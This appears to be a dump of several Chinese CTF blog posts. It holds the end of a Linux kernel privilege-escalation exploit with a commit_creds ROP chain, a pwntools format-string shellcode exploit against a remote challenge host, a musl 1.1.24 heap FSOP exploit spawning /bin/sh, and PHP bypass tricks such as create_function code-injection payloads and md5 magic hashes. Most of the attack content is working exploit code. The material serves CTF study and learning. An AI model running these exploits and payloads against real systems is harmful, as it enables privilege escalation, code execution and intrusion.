if (!fork())        &#123;            syscall(SYS_modify_ldt, 0, info, 0x1000);            for (int i = 0; i &lt; 0x1000 / 8; i++)            &#123;                if (info[i] &gt; vmlinux_base &amp;&amp; (info[i] &amp; 0xfff) == 0x040)                &#123;                    kernel_base = info[i] - 0x40;                    kernel_offset = kernel_base - vmlinux_base;                    printf(&quot;\\033[32m\\033[1m[+] Found kernel base: \\033[0m%p\\n&quot;, kernel_base);                    printf(&quot;\\033[32m\\033[1m[+] Kernel offset: \\033[0m%p\\n&quot;, kernel_offset);                &#125;            &#125;            write(pipe_fd[1], &amp;kernel_base, 8);            exit(0);        &#125;        wait(NULL);        read(pipe_fd[0], &amp;kernel_base, 8);        if (kernel_base)        &#123;            kernel_offset = kernel_base - vmlinux_base;            break;        &#125;        search_addr += 0x1000;        *(unsigned long long *)buf = search_addr;    &#125;    create(1);    select(1);    delete (1);    seq_fd = open(&quot;/proc/self/stat&quot;, 0);    add_rsp_pop_pop = 0xffffffff817c21a6 + kernel_offset;    pop_rdi = 0xffffffff81075c4c + kernel_offset;    init_cred = 0xffffffff8266b780 + kernel_offset;    commit_creds = 0xffffffff810c9dd0 + kernel_offset;    swapgs = 0xffffffff81078130 + kernel_offset;    iretq = 0xffffffff810002df + kernel_offset;    swapgs_restore_regs_and_return_to_usermode = 0xffffffff81c00fba + kernel_offset;    shell_addr = (uint64_t)get_shell;    edit(add_rsp_pop_pop);    __asm__(        &quot;mov r15,   0xbeefdead\\n&quot;        &quot;mov r14,   0xbeefdead\\n&quot;        &quot;mov r13,   pop_rdi\\n&quot;        &quot;mov r12,   init_cred\\n&quot;        &quot;mov rbp,   commit_creds\\n&quot;        &quot;mov rbx,   swapgs_restore_regs_and_return_to_usermode\\n&quot;        &quot;mov r11,   0xbeefdead\\n&quot;        &quot;mov r10,   0xbeefdead\\n&quot;        &quot;mov r9,    0xbeefdead\\n&quot;        &quot;mov r8,    0xbeefdead\\n&quot;        &quot;xor rax,   rax\\n&quot;        &quot;mov rcx,   0xbeefdead\\n&quot;        &quot;mov rdx,   8\\n&quot;        &quot;mov rsi,   rsp\\n&quot;        &quot;mov rdi,   seq_fd\\n&quot;        &quot;syscall&quot;);    return 0;&#125;\n\n\n题目放在：https://github.com/196082/196082\n\n参考链接：https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/#Step-I-%E6%B3%84%E9%9C%B2-page-offset-base-1\n","categories":["kernel-pwn"],"tags":["modify_ldt","pt_regs","seq_operations","bypass kpti"]},{"title":"nobug","url":"/2022/01/01/nobug/","content":"以前以为非栈上的格式化字符串应该跟栈上的差不多所以就没怎么去了解，可以说是完全没学非栈上的格式化字符串。\n%n\n在上图的红色框中存在一条链假定为p1-&gt;p2-&gt;p3-&gt;p4，我们都知道在gdb中第一列为地址，第二列为值，而第三列则是指针所指向的值。而%n实际上就是修改其第三列，就跟scanf(&quot;%d&quot;,&amp;n);同理。\n所以最终的效果就是我们使用%n修改值修改的是p3。下面回到题目。\n检查保护\n几乎什么都没开，重要的是没开nx保护，可以直接写shellcode。这次程序的代码有点长就不放上来了，存在这样一个函数sub_804869D，看起来很复杂还很长，我也不知道是什么看了wp发现是一个base64_decode。\n流程分析int sub_8048B76()&#123;  size_t v0; // eax  const char *v1; // eax  v0 = strlen(s);  v1 = sub_804869D(s, v0, 0);  return snprintf(byte_804A8A0, 0x800u, &quot;%s&quot;, v1);&#125;\n\n在输入完内容解密之后打印出来还没发现问题。\nint sub_8048B32()&#123;  size_t v0; // eax  const char *v1; // eax  v0 = strlen(s);  v1 = sub_804869D(s, v0, 0);  return snprintf(byte_804A8A0, 0x800u, v1);&#125;\n\n在这个函数发现了存在格式化字符串漏洞。但是看了一圈没找到什么地方会往这个函数执行。去看和漏洞函数很相似的上面那个函数的汇编代码的时候发现了\n.text:08048B76 sub_8048B76     proc near               ; CODE XREF: sub_8048BD4+6↓p.text:08048B76 ; __unwind &#123;.text:08048B76                 push    ebp.text:08048B77                 mov     ebp, esp.text:08048B79                 sub     esp, 18h.text:08048B7C                 mov     dword ptr [esp], offset s ; s.text:08048B83                 call    _strlen.text:08048B88                 mov     dword ptr [esp+8], 0.text:08048B90                 mov     [esp+4], eax.text:08048B94                 mov     dword ptr [esp], offset s.text:08048B9B                 call    sub_804869D.text:08048BA0                 mov     [esp+0Ch], eax.text:08048BA4                 mov     dword ptr [esp+8], offset format ; &quot;%s&quot;.text:08048BAC                 mov     dword ptr [esp+4], 800h ; maxlen.text:08048BB4                 mov     dword ptr [esp], offset byte_804A8A0 ; s.text:08048BBB                 call    _snprintf.text:08048BC0                 push    offset sub_8048BD1.text:08048BC5                 push    offset sub_8048B32.text:08048BCA                 push    0.text:08048BCC                 lea     esp, [esp+4].text:08048BD0                 retn\n\n下面几行会将sub_8048B32推进栈里，然后下面还有个lea正好吧esp改变过去了，所以是一定会去执行sub_8048B32这个函数的。\n在执行完sub_8048B32会发生什么？\n\n\n可以看到程序是利用了类似于ROP的思想进行的。\n利用分析\n发现疑似可利用的地方，马上调试程序\n\n 这就是刚刚找的东西，但是直接利用肯定不行。所以我们要构造出来p1-&gt;p2-&gt;p3的结构\n\n很容易可以看到ebp存在这样一条链子，0xffffce08也存在，我们若是让0xffffce08的值等于0xffffce0c那我们岂不是就构成了这样一条链子？\n0xffffce08-&gt;0xffffce0c-&gt;0x8048bdf这时候修改0x8048bdf到shellcode的地址就可以了。\n已知ebp为%4$，再结合文章开头所说的，那么我们就可以通过%4$修改%12$的值为%13$，然后利用%12$修改%13$的值为我们的shellcode。\nexpfrom pwn import *import base64elf = ELF(&#x27;./4f59876cebb1469ca62254c162306aa5&#x27;)# r = process(&#x27;./4f59876cebb1469ca62254c162306aa5&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 52730)context.arch = &#x27;i386&#x27;context.os = &#x27;linux&#x27;context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]shellcode_addr = 0x804A8A0r.sendline(base64.b64encode(b&#x27;%4$p&#x27;))ret_addr = int(r.recvuntil(b&#x27;\\n&#x27;, drop=True), 16)+4print(hex(ret_addr))shellcode = asm(shellcraft.sh())payload = shellcode+b&#x27;%&#x27; + \\    bytes(str((ret_addr &amp; 0xff)-len(shellcode)),          encoding=&#x27;utf8&#x27;)+b&#x27;c%4$hhn%&#x27; + \\    bytes(str((shellcode_addr &amp; 0xff)-(ret_addr &amp; 0xff)),          encoding=&#x27;utf8&#x27;)+b&#x27;c%12$hn&#x27;payload = base64.b64encode(payload)r.sendline(payload)r.interactive()\n\n参考文章https://www.cjovi.icu/WP/buu-xman_2019_format-wp.html\n","categories":["pwn-xctf"],"tags":["格式化字符串"]},{"title":"musl 1.1.24利用方式","url":"/2022/04/27/musl-1-1-24%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/","content":"这个月干的是属实有点儿少，感觉特别迷茫，学了那么多结果比赛还是一头雾水，虽然很烦躁但是还是不能放弃啊！\n在starCTF的第二道题我始终找不到漏洞点在哪，下来看wp才发现使用的libc不是普通的glibc了，其实在RCTF的一道题目就是基于musl的但是无奈github的仓库当中并没有题目的源码所以没去深入了解，在starCTF过后也算是了解一下这一相较于glic更为轻量的libc了。\n首先本文先介绍一下这一libc\nmusl 1.1.24musl libc 是一个专门为嵌入式系统开发的轻量级 libc 库，以简单、轻量和高效率为特色。有不少 Linux 发行版将其设为默认的 libc 库，用来代替体积臃肿的 glibc ，如 Alpine Linux（做过 Docker 镜像的应该很熟悉）、OpenWrt（常用于路由器）和 Gentoo 等。\n数据结构这一版本的chunk结构其实是和glibc相差不大的。\nstruct chunk &#123;    size_t psize, csize;     struct chunk *next, *prev;&#125;;\n\npsize和csize字段都有标志位（glibc 只有size字段有），但只有一种位于最低位的标志位INUSE（glibc 最低三位都有标志位）。若设置INUSE标志位（最低位为1），表示 chunk 正在被使用；若没有设置INUSE标志位（最低位为0），表示 chunk 已经被释放或者通过mmap分配的，需要通过psize的标志位来进一步判断 chunk 的状态。\nstatic struct &#123;    volatile uint64_t binmap;    struct bin bins[64];    volatile int free_lock[2];&#125; mal;\n\n这个mal结构体很类似main_arena，里面记录着堆的信息，有三个成员：64位无符号整数binmap、链表头部数组bins和锁free_lock。binmap记录每个 bin 是否为非空，若某个比特位为 1，表示对应的 bin 为非空，即 bin 链表中有 chunk。\nstruct bin &#123;    volatile int lock[2];    struct chunk *head;    struct chunk *tail;&#125;;\n\nbin 链表头部的结构如上。head和tail指针分别指向首部和尾部的 chunk，同时首部 chunk 的prev指针和尾部 chunk 的next指针指向 bin 链表头部，这样构成了循环链表。当链表为空时，head和tail指针等于 0 或者指向链表头部自身。\n看mal结构可以看到有64的bin，前面32个bin是类似于small bin的结构，存放的chunk的大小是固定的，但是后面的就类似于large bin存放的是在一定范围的chunk了。\nmalloc// src/malloc/malloc.c L284-L331void *malloc(size_t n)&#123;    struct chunk *c;    int i, j;    // 1. n 增加头部长度 OVERHEAD (0x10)，对齐 32 位：    // *n = (*n + OVERHEAD + SIZE_ALIGN - 1) &amp; SIZE_MASK;    if (adjust_size(&amp;n) &lt; 0) return 0;    // 若 n 到达 MMAP_THRESHOLD (0x38000)，使用 mmap chunk    if (n &gt; MMAP_THRESHOLD) &#123;        [...]        return CHUNK_TO_MEM(c);    &#125;    // 2. 计算 n 对应的 bin 下标 i    i = bin_index_up(n);    for (;;) &#123;        // 3. 查找 binmap        uint64_t mask = mal.binmap &amp; -(1ULL&lt;&lt;i);        // 若所有的可用 bin 均为空，调用 expand_heap 函数延展堆空间，生成新的 chunk        if (!mask) &#123;            c = expand_heap(n);            [...]            break;        &#125;        // 4. 获取大小最接近 n 的可用 bin 下标 j        j = first_set(mask);        lock_bin(j);        c = mal.bins[j].head; // c 是 bin j 链表首部的 chunk        // 5. 若符合条件，使用 pretrim 分割 c，否则使用 unbin 从链表中取出 c        if (c != BIN_TO_CHUNK(j)) &#123;            if (!pretrim(c, n, i, j)) unbin(c, j);            unlock_bin(j);            break;        unlock_bin(j);    &#125;    // 6. 回收 c 中大小超过 n 的部分    /* Now patch up in case we over-allocated */    trim(c, n);    return CHUNK_TO_MEM(c);&#125;\n\n大概步骤就是：\n\n调整n，增加头部的长度然后对齐32位\n\n如果n&gt;MMAP_THRESHOLD，则使用mmap创建一块大小为n的内存返回\n\n如果n&lt;=MMAP_THRESHOLD，计算n对应的bin的i，查找binmap\n​    如果所有可用bin都为空，那么就扩展堆空间，生存一个新的chunk\n​    如果存在非空的bin，则大小最接近n的bin，将bin首部的chunk返回\n​        如果符号pretrime条件，使用pretrime分割\n​        否则使用unbin从链表中取出\n​    最后对chunk进行trim，返回给用户\n\n\nstatic void unbin(struct chunk *c, int i)&#123;    // 若 bin 只有一个 chunk，将 bin 设为空 bin    if (c-&gt;prev == c-&gt;next)        a_and_64(&amp;mal.binmap, ~(1ULL&lt;&lt;i));    // 取出链表中的 chunk    c-&gt;prev-&gt;next = c-&gt;next;    c-&gt;next-&gt;prev = c-&gt;prev;    // 设置 INUSE 标志位    c-&gt;csize |= C_INUSE;    NEXT_CHUNK(c)-&gt;psize |= C_INUSE;&#125;\n\n这其实就是取出chunk的一个操作，可以看到取出的过程中并没有检测chunk指针的合法性，这也就造成了安全隐患\nstatic int pretrim(struct chunk *self, size_t n, int i, int j)&#123;    size_t n1;    struct chunk *next, *split;    // 条件 1: bin j 下标大于 40    /* We cannot pretrim if it would require re-binning. */    if (j &lt; 40) return 0;    // 条件 2: bin j 与 i 相隔 3 个 bin 或以上，    // 或者 j 等于 63 且 split 的大小大于 MMAP_THRESHOLD    if (j &lt; i+3) &#123;        if (j != 63) return 0;        n1 = CHUNK_SIZE(self);        if (n1-n &lt;= MMAP_THRESHOLD) return 0;    &#125; else &#123;        n1 = CHUNK_SIZE(self);    &#125;    // 条件 3: split 的大小属于 bin j 范围内，即 split 与 self 属于同一个 bin    if (bin_index(n1-n) != j) return 0;    // 切割出一块大小为 n 的 chunk    next = NEXT_CHUNK(self);    split = (void *)((char *)self + n);    split-&gt;prev = self-&gt;prev;    split-&gt;next = self-&gt;next;    split-&gt;prev-&gt;next = split;    split-&gt;next-&gt;prev = split;    split-&gt;psize = n | C_INUSE;    split-&gt;csize = n1-n;    next-&gt;psize = n1-n;    self-&gt;csize = n | C_INUSE;    return 1;&#125;\n\npretrim的作用是切割大 chunk，防止把大小超过需求的 chunk 分配给用户。当满足一定条件时，pretrim从 bin 链表首部 chunk 切割出一块大小刚好符合需求的小 chunk，然后将小 chunk 分配给用户，链表首部 chunk 的位置保持不变。\nstatic void trim(struct chunk *self, size_t n)&#123;    size_t n1 = CHUNK_SIZE(self);    struct chunk *next, *split;    // 条件：self 的大小 n1 多于 n DONTCARE (0x10) 字节    if (n &gt;= n1 - DONTCARE) return;    // 将 self 的大小切割为 n，剩余部分成为新的 chunk split    next = NEXT_CHUNK(self);    split = (void *)((char *)self + n);    split-&gt;psize = n | C_INUSE;    split-&gt;csize = n1-n | C_INUSE;    next-&gt;psize = n1-n | C_INUSE;    self-&gt;csize = n | C_INUSE;    // 将 split 释放到 bin    __bin_chunk(split);&#125;\n\nmalloc 的最后一步是trim，主要作用是回收 chunk 超过需求大小的部分。trim将 chunk 多余的部分切割出来，然后将其释放到 bin 中，减少内存浪费。\nfreevoid free(void *p)&#123;    if (!p) return;    struct chunk *self = MEM_TO_CHUNK(p);    // 若 csize 没有设置 INUSE 标志位，检查是否为 mmap chunk 或者 double free    // #define IS_MMAPPED(c) !((c)-&gt;csize &amp; (C_INUSE))    if (IS_MMAPPED(self))        unmap_chunk(self);    else        __bin_chunk(self);&#125;\n\nstatic void unmap_chunk(struct chunk *self)&#123;    size_t extra = self-&gt;psize;    char *base = (char *)self - extra;    size_t len = CHUNK_SIZE(self) + extra;    // 若 prev size 设置了 INUSE 标志位，视为 double free，crash    /* Crash on double free */    if (extra &amp; 1) a_crash();    __munmap(base, len);&#125;\n\nfree 先对 chunk 进行 mmap / double free 检查。如果 chunk 的csize字段没有设置INUSE标志位，进入unmap_chunk函数检查psize字段。如果psize字段设置了INUSE标志位，视为 double free，crash；否则视为 mmap chunk，调用__munmap函数释放。\nvoid __bin_chunk(struct chunk *self)&#123;    struct chunk *next = NEXT_CHUNK(self);    size_t final_size, new_size, size;    int reclaim=0;    int i;    // new_size 是 self 原来的大小，final_size 是 self 合并空闲 chunk 后的大小    final_size = new_size = CHUNK_SIZE(self);    // 若下一个 chunk 的 psize 不等于 self 的 csize，则 crash    /* Crash on corrupted footer (likely from buffer overflow) */    if (next-&gt;psize != self-&gt;csize) a_crash();    // 1. 检查 self 前后是否有空闲 chunk    for (;;) &#123;        if (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE) &#123;            // 去除 INUSE 标志位            self-&gt;csize = final_size | C_INUSE;            next-&gt;psize = final_size | C_INUSE;            // 计算 final_size 对应的 bin 下标 i            i = bin_index(final_size);            lock_bin(i);            lock(mal.free_lock);            if (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE)                break;  // 退出循环            unlock(mal.free_lock);            unlock_bin(i);        &#125;        // 向前合并空闲 chunk        if (alloc_rev(self)) &#123;  // 从 bin 链表取出待合并的空闲 chunk            self = PREV_CHUNK(self);            size = CHUNK_SIZE(self);            final_size += size;            if (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)                reclaim = 1;        &#125;        // 向后合并空闲 chunk        if (alloc_fwd(next)) &#123;  // 从 bin 链表取出待合并的空闲 chunk            size = CHUNK_SIZE(next);            final_size += size;            if (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)                reclaim = 1;            next = NEXT_CHUNK(next);        &#125;    &#125;    //2. 在 binmap 中，将 bin i 设为非空 bin    if (!(mal.binmap &amp; 1ULL&lt;&lt;i))        a_or_64(&amp;mal.binmap, 1ULL&lt;&lt;i);    self-&gt;csize = final_size;    next-&gt;psize = final_size;    unlock(mal.free_lock);    // 3. 将 self 加入到 bin i 链表的尾部    self-&gt;next = BIN_TO_CHUNK(i);    self-&gt;prev = mal.bins[i].tail;    self-&gt;next-&gt;prev = self;    self-&gt;prev-&gt;next = self;    /* Replace middle of large chunks with fresh zero pages */    if (reclaim) &#123;        [...]    &#125;    unlock_bin(i);&#125;\n\n__bin_chunk函数的作用是将 chunk 插入到 bin 链表中。首先合并 chunk 前后的空闲 chunk、设置 binmap 和 chunk 标志位，最后将 chunk 插入到对应的 bin 链表中。\n然后在musl当中的堆管理为了减少内存的使用会直接将libc和程序当中的空闲的内存当作堆内存，而glibc的堆地址一般都是位于内存中的动态内存区域。\nXCTF_2020_PWN_musl\n可以看到这里确实是直接在libc和process上面有堆的地址。\n题目分析就是很经典的菜单题，并且在create函数里面有一处只能运行一次的0x50的溢出，而且题目只有一处使用exit退出程序，然后show函数也只有一次。\n利用分析其实利用思路就很简单了，存在溢出，unbin又有如此大的安全隐患，所以就是通过溢出修改掉next指针和prev指针从而实现任意地址写，造成FSOP\n这里说一下怎么造成的FSOP\n_Noreturn void exit(int code)&#123;\t__funcs_on_exit();\t__libc_exit_fini();\t__stdio_exit();\t_Exit(code);&#125;\n\nstatic void close_file(FILE *f)&#123;\tif (!f) return;\tFFINALLOCK(f);\tif (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, 0, 0);\tif (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);&#125;void __stdio_exit(void)&#123;\tFILE *f;\tfor (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);\tclose_file(__stdin_used);\tclose_file(__stdout_used);\tclose_file(__stderr_used);&#125;\n\n可以看到最后是有机会调用到file的内部函数指针的\nstruct _IO_FILE &#123;\tunsigned flags;\tunsigned char *rpos, *rend;\tint (*close)(FILE *);\tunsigned char *wend, *wpos;\tunsigned char *mustbezero_1;\tunsigned char *wbase;\tsize_t (*read)(FILE *, unsigned char *, size_t);\tsize_t (*write)(FILE *, const unsigned char *, size_t);\toff_t (*seek)(FILE *, off_t, int);\tunsigned char *buf;\tsize_t buf_size;\tFILE *prev, *next;\tint fd;\tint pipe_pid;\tlong lockcount;\tint mode;\tvolatile int lock;\tint lbf;\tvoid *cookie;\toff_t off;\tchar *getln_buf;\tvoid *mustbezero_2;\tunsigned char *shend;\toff_t shlim, shcnt;\tFILE *prev_locked, *next_locked;\tstruct __locale_struct *locale;&#125;;\n\n所以我们需要利用exit来执行FSOP，不过难点就是怎么运行到exit，因为需要malloc返回一个0xdeadbeef，在上面可以看到，如果所有的bin都为空，此时malloc就会调用expand_heap来扩展堆，本质还是调用了__expand_heap函数\nvoid *__expand_heap(size_t *pn)&#123;\tstatic uintptr_t brk;\tstatic unsigned mmap_step;\tsize_t n = *pn;\tif (n &gt; SIZE_MAX/2 - PAGE_SIZE) &#123;\t\terrno = ENOMEM;\t\treturn 0;\t&#125;\tn += -n &amp; PAGE_SIZE-1;\tif (!brk) &#123;\t\tbrk = __syscall(SYS_brk, 0);\t\tbrk += -brk &amp; PAGE_SIZE-1;\t&#125;\tif (n &lt; SIZE_MAX-brk &amp;&amp; !traverses_stack_p(brk, brk+n)\t    &amp;&amp; __syscall(SYS_brk, brk+n)==brk+n) &#123;\t\t*pn = n;\t\tbrk += n;\t\treturn (void *)(brk-n);\t&#125;\tsize_t min = (size_t)PAGE_SIZE &lt;&lt; mmap_step/2;\tif (n &lt; min) n = min;\tvoid *area = __mmap(0, n, PROT_READ|PROT_WRITE,\t\tMAP_PRIVATE|MAP_ANONYMOUS, -1, 0);\tif (area == MAP_FAILED) return 0;\t*pn = n;\tmmap_step++;\treturn area;&#125;\n\n在__expand_heap函数中，brk是指向数据段末尾位置的指针。__expand_heap函数调用 brk 系统调用__syscall(SYS_brk, brk+n)，将数据段末尾向后延展n字节，然后延展部分返回给malloc作为新的 chunk 分配给用户\n若程序不开启 PIE，数据段的地址长度为 24 bit（0~0x2000000），内存位置与0xBADBEEF比较接近。若将brk指针修改为0xBADBEEF - n，brk 系统调用就会把数据段延展至0xBADBEEF，使其成为可访问的内存地址。\nexpfrom pwn import *elf = ELF(&#x27;./carbon&#x27;)# r = process([&#x27;./libc.so&#x27;, &#x27;carbon&#x27;])# libc = ELF(&#x27;./libc.so&#x27;)# r = process([&#x27;/ctf/work/download/libc.so&#x27;, &#x27;./carbon&#x27;])# libc = ELF(&#x27;/ctf/work/download/libc.so&#x27;)r = process([&#x27;../../libc/libc1.1.24.so&#x27;, &#x27;./carbon&#x27;])libc = ELF(&#x27;../../libc/libc1.1.24.so&#x27;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]def menu(option):    r.recvuntil(b&#x27;&gt; &#x27;)    r.sendline(bytes(str(option), encoding=&#x27;utf8&#x27;))def create(size, believer, content):    menu(1)    r.recvuntil(b&#x27;What is your prefer size? &gt;&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;Are you a believer? &gt;&#x27;)    r.sendline(believer)    r.recvuntil(b&#x27;Say hello to your new sleeve &gt;&#x27;)    r.send(content)def delete(idx):    menu(2)    r.recvuntil(b&#x27;What is your sleeve ID? &gt;&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))def edit(idx, content):    menu(3)    r.recvuntil(b&#x27;What is your sleeve ID? &gt;&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.send(content)def show(idx):    menu(4)    r.recvuntil(b&#x27;What is your sleeve ID? &gt;&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;create(0x1, b&#x27;N&#x27;, b&#x27;a&#x27;)show(0)libc_base = u64(r.recvuntil(b&#x27;Done.&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;)) - 0x29de61print(&#x27;libc_base=&gt;&#x27;, hex(libc_base))bin_addr = libc_base + 0x29de00 - 0x8stdin_addr = libc_base + libc.symbols[&#x27;__stdin_FILE&#x27;]system_addr = libc_base + libc.symbols[&#x27;system&#x27;]binmap_addr = libc_base + 0x29da80brk_addr = libc_base + libc.symbols[&#x27;brk&#x27;]create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 1create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 2create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 3create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 4create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 5create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 6create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 7create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 8delete(1)delete(3)payload = b&#x27;a&#x27; * 0x10payload += p64(0x21) + p64(0x21) + b&#x27;a&#x27; * 0x10payload += p64(0x21) + p64(0x20) + p64(stdin_addr -                                       0x10) + p64(stdin_addr -                                                   0x10) + p8(0x20)create(0x10, b&#x27;Y&#x27;, payload + b&#x27;\\n&#x27;)  # 1create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 3delete(5)edit(3, flat(stdin_addr - 0x10, bin_addr))create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 5file_struct = b&#x27;/bin/sh\\x00&#x27; + b&#x27;a&#x27; * 0x20file_struct += p64(0) * 2 + p64(1) * 2 + p64(system_addr)create(0x50, b&#x27;N&#x27;, b&#x27;\\n&#x27;)  # 9delete(7)edit(3, flat(brk_addr - 0x10, brk_addr - 0x10))create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 7delete(1)edit(3, flat(binmap_addr - 0x10, binmap_addr - 0x10))create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 1delete(7)edit(3, flat(binmap_addr - 0x10, bin_addr))create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 7create(0x50, b&#x27;N&#x27;, b&#x27;\\n&#x27;)  # 10delete(1)edit(3, flat(brk_addr - 0x10, bin_addr))create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 1create(0x50, b&#x27;N&#x27;, b&#x27;\\n&#x27;)  # 11edit(9, file_struct)edit(11, p64(0xbadbeef - 0x20) + b&#x27;\\n&#x27;)edit(10, b&#x27;a&#x27; * 0x10 + p64(0) + b&#x27;\\n&#x27;)r.recvuntil(b&quot;&gt;&quot;)r.sendlien(b&#x27;1&#x27;)r.recvuntil(b&#x27;What is your prefer size? &gt;&#x27;)r.sendline(b&#x27;0&#x27;)r.interactive()\n\n然后就是我这里的libc是自己编译的和题目一直有出入，所以我这个exp可能不能直接用在题目上，同时我也问了其他师傅这个编译该怎么办，还在等回复~\n\n参考链接：https://www.anquanke.com/post/id/202253%23h2-4#h3-14\n","categories":["pwn"],"tags":["musl"]},{"title":"ctf中php常被我忽略的细节","url":"/2021/09/17/php-detail/","content":"\nsession操作\n\n&lt;?php   \t//在最开始使用session_start();    session_start();\t//根据用户传到后台的sessionId找到相应的文件，可以在phpinfo()里找到session_save_path\t$_SEESION[&#x27;username&#x27;]//可以访问到文件中存放的session值?&gt;\n\n&lt;?php    //在存放session时比如    $_SEESION[&#x27;username&#x27;]=&quot;admin&quot;    //在本地文件中的存放形式为：username|s:5:&quot;admin&quot;    //当中的`|`为键值对的符号\n\n\ncreate_function绕过\n\n&lt;?php    //在php里面有create_function方法    create_function(&quot;$a,$b&quot;,&quot;return $a*$b&quot;);?&gt;以上代码等价于&lt;?php    function name($a,$b)&#123;    return $a*$b;\t&#125;\t//所以就有了思路去绕过\t//假如上传的请求体的参数会占据create_function里面的任意的一个参数\t$a=$_GET[&#x27;id&#x27;];\tcreate_function($a,&quot;&quot;);?&gt;使用payload:&#x27;)&#123;&#125;执行代码;//&#x27;&lt;?php    //产生的结果就为    function name()&#123;&#125;执行代码;//&#123;&#125;?&gt;当然在后面的那一个参数也可以类比了payload:&#x27;&#125;code;//&#x27;&lt;?php    function name()&#123;&#125;code;//&#125;?&gt;\n\n\n绕过preg_match\n\n&lt;?php    preg_match(&quot;/^[0-9,a-z_]$/isD&quot;)    //在绕过这个函数的时候应为后面存在s所以可以尝试?&gt;可用python写脚本找到断点\n\nimport requestsfor i in range(256):    var=hex(i)[2:]    if(len(var)&lt;2):        var=&quot;0&quot;+var    var=&quot;%&quot;+var    url=&quot;http://172.17.0.2/study/php_view/test.php?wow=&quot;+var+&quot;b=dzhsb&quot;    res=requests.get(url=url).text    if(&quot;dzhsb&quot; in res):        print(url)        break# 可以获得断点# 如果用.进行任意字符匹配可以用%0a换行符绕过\n\n\n正则表达式的字符类\n\n[:alpht:]匹配所有的字母;[:upper:]匹配所有的大写字母;[:lower:]匹配所有的小写字母;[:digit:]匹配所有数字;[:alnum:]匹配所有数字、字母;[:xdigit:]匹配任何十六进制数字;[:space:]匹配制表符，换行符，垂直制表符，换页，回车或空格;[:blank:]匹配空格或制表符;[:print:]匹配任何可打印的字符;[:punct:]匹配任何标点符号;[:graph:]匹配任何可打印但是除了空格类字符那些;[:word:]匹配字母数字字符和下划线的连续字符串;[:ascii:]匹配ascii码为0-127的字符;[:cntrl:]不属于字符类的任何字符:[:upper:],[:lower:],[:alpha:],[:digit:],[:punct:],[:graph:],[:print:],[:xdigit:];\n\n\n绕过一些关键词popen\n\n若是tail cat被过滤可用tacphp命令执行的代码passthru()函数localeconv()这个函数在不传递参数的情况下是返回&#x27;.&#x27;但是数据类型为数组,使用current()可以读取.&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;这样的正则表达式可以通过的为a(b(c()))一直套娃下去都可以通过strcpm绕过:\t数组的返回值会报错md5绕过(弱类型):\ts1502113478a    0e861580163291561247404381396064    s1885207154a    0e509367213418206700842008763514    s1836677006a    0e481036490867661113260034900752    s155964671a    0e342768416822451524974117254469    s1184209335a    0e072485820392773389523109082030\n\n\nphp原生类\n\n操作文件的原生类\n$test=new SplFileObject(filename,mode=&quot;r&quot;);var_dump($test-&gt;fpassthru());可以读取文件\n\n\nintval函数\n\nphp5    intval(&#x27;1e10&#x27;)--&gt;1    intval(&#x27;1e10&#x27;+1)--&gt;10000000php7行不通\n\n\nmt_rand()伪随机漏洞\n\n对于php的mt_rand产生的随机数实际上是受mt_srand种子(seed)所影响的\n\n会产生这样存在线性关系的随机数，可以同通过脚本暴力破解\na = &#x27;2BnGu1TiNa&#x27;b = &#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;res = &#x27;&#x27;# print(len(b))for i in range(len(a)):    for j in range(len(b)):        if a[i] == b[j]:            res += str(j)+&#x27; &#x27;+str(j)+&#x27; 0 &#x27;+str(len(b))+&#x27; &#x27;            breakprint(res)#得到每个字符位于的位置，然后通过这种傻逼的组合方式\n\n随后通过php_mt_seed爆出seed\n$ ./php_mt_seed 28 28 0 61 37 37 0 61 13 13 0 61 42 42 0 61 20 20 0 61 27 27 0 61 55 55 0 61 8 8 0 61 49 49 0 61 0 0 0 61Pattern: EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62Version: 3.0.7 to 5.2.0Found 0, trying 0xfc000000 - 0xffffffff, speed 1142.7 Mseeds/s Version: 5.2.1+Found 0, trying 0x0a000000 - 0x0bffffff, speed 108.9 Mseeds/s seed = 0x0a552021 